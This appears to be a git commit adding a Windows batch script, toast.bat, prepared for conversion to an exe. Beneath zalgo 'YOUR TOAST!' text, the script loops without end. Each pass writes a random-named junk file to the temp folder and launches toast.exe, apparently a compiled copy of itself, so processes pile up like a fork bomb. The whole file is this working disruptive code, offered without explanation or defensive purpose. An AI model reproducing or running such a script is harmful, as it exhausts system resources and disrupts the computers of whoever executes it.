fca21b02fb7488644b68b621b6558875401eadd9
unknown <jtrent238@outlook.com>
2020-10-27 15:11:12 -0400

    10272020311

---
+++ toast.bat
@@ -0,0 +1,60 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDpQQQ2MAGyzEokox8nI29aOoUITGus8d+8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSTk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MAGyzEokox8nI29aTrUwOQKw6YIq7
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+cls
+set toast= Y̶̛̱̬̝̺̣͈̫̹̺̖͈̻̼̏͂̂̑͑̉̃ͧ͒̔͌͋̂̚͢͢Õ͕͎̥̬̜̻̳̰̙̦̝̘̜̗̥̯̝ͯ̇̋̅̌̀̚͜͞U̢̡͎̥̥̠͑̐̓́̑̀̀R̟̩͚̞̖̬̭̻̅̆̅̎ͪͭ̅͆ͫ̿̌ͨ̓ͪ̍̃̀ ̷̡͚̳͎̖̻̻̝̥̼̰̲ͬͣ͗̌̈́͑̒̔̾̎͟Ť̓͌̃̈̌̿̓ͯ͌͒̃ͯ̚͢͏̡͖̠̻̼̫̮̣̗̫͉̝́Ơ̡͖̥̥̬͍̰̠̮̯̙̜͈̳̮̞̤̝̪̈͒̉̉ͭ͊A̸͓͓̙̫̠̪͚̙̫̹̝̱͕͎̞͚̱̩ͬͥ́̍͛͂̍̎̓̀ͣͣ̿ͭ̉͠S̴̛͙̤̻̭̫̳̙̙̰̻͔̱͊̉̍̾͒́ͥ͆̒̍̅̿́̀T̸͓͈̯̟͉̝͈͉͙͇̲͙̹͓͓̘̠̱̈̄̅ͣͦ̀͘͞!̶̸͉̟̤̤̣̎̔͐̆̅̈̔͛ͅ ̢̨̫̥̘̱͎͈̙͙̮̙̮̮͕̹̮͕̥͗ͣ̈ͬ̔̇ͭ̒̔͑͊ͬ̾̒̓̽ͣͤ̕
+:Y̮̱̟̜̳͉̼ͫ̂́̓̀͒Ȯ̷̤̜͚͍̼̞̩͆͆̚Ű̶ͭͣͣR̛̮̘̩͊̅͛ ̳̗̗̘͍̏͌ͥ̄̀ͪͥ́Ț̜͈͕͓̹Ó̜̹̮̥̺A̪̘̪͖͕̩̬ͯ͛ͩ̚Ș̠̤̲̮͎̯͂̒͌̂̐̔͟T̼̰̥̣͒́͆̒̚͠!̅͆̏ͩ̂̓ ̤̫̝̦̞͌͒
+echo %toast%
+@Echo Off
+Setlocal EnableDelayedExpansion
+Set _RNDLength=500
+Set _Alphanumeric= Y̶̛̱̬̝̺̣͈̫̹̺̖͈̻̼̏͂̂̑͑̉̃ͧ͒̔͌͋̂̚͢͢Õ͕͎̥̬̜̻̳̰̙̦̝̘̜̗̥̯̝ͯ̇̋̅̌̀̚͜͞U̢̡͎̥̥̠͑̐̓́̑̀̀R̟̩͚̞̖̬̭̻̅̆̅̎ͪͭ̅͆ͫ̿̌ͨ̓ͪ̍̃̀ ̷̡͚̳͎̖̻̻̝̥̼̰̲ͬͣ͗̌̈́͑̒̔̾̎͟Ť̓͌̃̈̌̿̓ͯ͌͒̃ͯ̚͢͏̡͖̠̻̼̫̮̣̗̫͉̝́Ơ̡͖̥̥̬͍̰̠̮̯̙̜͈̳̮̞̤̝̪̈͒̉̉ͭ͊A̸͓͓̙̫̠̪͚̙̫̹̝̱͕͎̞͚̱̩ͬͥ́̍͛͂̍̎̓̀ͣͣ̿ͭ̉͠S̴̛͙̤̻̭̫̳̙̙̰̻͔̱͊̉̍̾͒́ͥ͆̒̍̅̿́̀T̸͓͈̯̟͉̝͈͉͙͇̲͙̹͓͓̘̠̱̈̄̅ͣͦ̀͘͞!̶̸͉̟̤̤̣̎̔͐̆̅̈̔͛ͅ ̢̨̫̥̘̱͎͈̙͙̮̙̮̮͕̹̮͕̥͗ͣ̈ͬ̔̇ͭ̒̔͑͊ͬ̾̒̓̽ͣͤ̕
+Set _Str=%_Alphanumeric%987654321
+:_LenLoop
+IF NOT "%_Str:~18%"=="" SET _Str=%_Str:~9%& SET /A _Len+=9& GOTO :_LenLoop
+SET _tmp=%_Str:~9,1%
+SET /A _Len=_Len+_tmp
+Set _count=100
+SET _RndAlphaNum=
+:_loop
+Set /a _count+=1
+SET _RND=%Random%
+Set /A _RND=_RND%%%_Len%
+SET _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
+If !_count! lss %_RNDLength% goto _loop
+Echo Random string is !_RndAlphaNum!
+echo !_RndAlphaNum!>%temp%/!_RndAlphaNum!
+start toast.exe
+goto Y̮̱̟̜̳͉̼ͫ̂́̓̀͒Ȯ̷̤̜͚͍̼̞̩͆͆̚Ű̶ͭͣͣR̛̮̘̩͊̅͛ ̳̗̗̘͍̏͌ͥ̄̀ͪͥ́Ț̜͈͕͓̹Ó̜̹̮̥̺A̪̘̪͖͕̩̬ͯ͛ͩ̚Ș̠̤̲̮͎̯͂̒͌̂̐̔͟T̼̰̥̣͒́͆̒̚͠!̅͆̏ͩ̂̓ ̤̫̝̦̞͌͒
+pause
